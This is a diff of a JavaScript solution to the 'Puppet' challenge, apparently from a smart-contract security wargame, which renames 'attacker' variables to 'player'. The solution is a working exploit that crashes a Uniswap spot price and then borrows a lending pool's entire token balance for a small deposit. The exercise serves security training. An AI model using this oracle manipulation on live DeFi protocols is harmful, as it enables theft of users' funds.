@@ -169,9 +169,9 @@ describe('[Challenge] Puppet', function () {
         /** CODE YOUR EXPLOIT HERE */
 
         // Connect to the contracts with the attackers wallet
-        const attackPuppet = this.lendingPool.connect(attacker);
-        const attackToken = this.token.connect(attacker);
-        const attackUniSwap = this.uniswapExchange.connect(attacker);
+        const attackPuppet = lendingPool.connect(player);
+        const attackToken = token.connect(player);
+        const attackUniSwap = uniswapExchange.connect(player);
 
         // Helper function to get current token/eth balances
         const logAttackerBalances = async (address, name) => {
@@ -183,16 +183,16 @@ describe('[Challenge] Puppet', function () {
             console.log("")
         }
 
-        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(player.address, "attacker");
         await logAttackerBalances(attackUniSwap.address, "uniswap");
 
         // Approve token to swap with UniSwap
         console.log("Approving Initial Balance");
-        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await attackToken.approve(attackUniSwap.address, PLAYER_INITIAL_TOKEN_BALANCE);
         console.log("Balance approved");
 
         // Calculate ETH Pay out
-        const ethPayout = await attackUniSwap.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+        const ethPayout = await attackUniSwap.getTokenToEthInputPrice(PLAYER_INITIAL_TOKEN_BALANCE,
             {
                 gasLimit: 1e6
             });
@@ -201,24 +201,24 @@ describe('[Challenge] Puppet', function () {
 
         console.log("Transferring tokens for ETH");
         await attackUniSwap.tokenToEthSwapInput(
-            ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount of tokens to transfer
+            PLAYER_INITIAL_TOKEN_BALANCE, // Exact amount of tokens to transfer
             ethers.utils.parseEther("9"), // Min return of 9ETH
             (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
         )
 
-        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(player.address, "attacker");
         await logAttackerBalances(attackUniSwap.address, "uniswap");
 
 
         // Deposit ETH required to gain ALL tokens from the pool
         const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
         console.log("Deposit required:", ethers.utils.formatEther(deposit));
-        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
             value: deposit
         })
-        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(player.address, "attacker");
 
-        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
+        const tokensToBuyBack = PLAYER_INITIAL_TOKEN_BALANCE;
         const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack,
         {
             gasLimit: 1e6
@@ -236,7 +236,7 @@ describe('[Challenge] Puppet', function () {
         )
             
         console.log("*** FINISHED ***")
-        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(player.address, "attacker");
         await logAttackerBalances(attackPuppet.address, "Lender");
         await logAttackerBalances(attackUniSwap.address, "Uniswap");
 
